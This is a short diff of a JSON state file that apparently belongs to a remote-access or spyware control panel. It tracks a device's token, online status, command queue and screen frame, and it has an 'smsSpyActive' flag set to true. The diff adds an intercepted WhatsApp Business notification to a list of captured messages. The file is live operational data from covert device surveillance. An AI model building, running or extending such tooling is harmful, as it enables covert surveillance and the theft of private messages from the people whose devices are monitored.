@@ -886,7 +886,7 @@
     "deviceName": "HP-ZAL7SEX-A9BC",
     "ownerUsername": "Zal7Sex",
     "token": "9d4d7c7b2406bb01c99ae99a0bf14177",
-    "lastSeen": 1776365554436,
+    "lastSeen": 1776365578445,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-16T18:47:50.817Z",
@@ -902,6 +902,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "Call Me Zal7Sex",
+        "content": "📷 Photo",
+        "time": "17/04 01:52",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776365555738
+      },
       {
         "appName": "WA Business",
         "sender": "Call Me Zal7Sex",
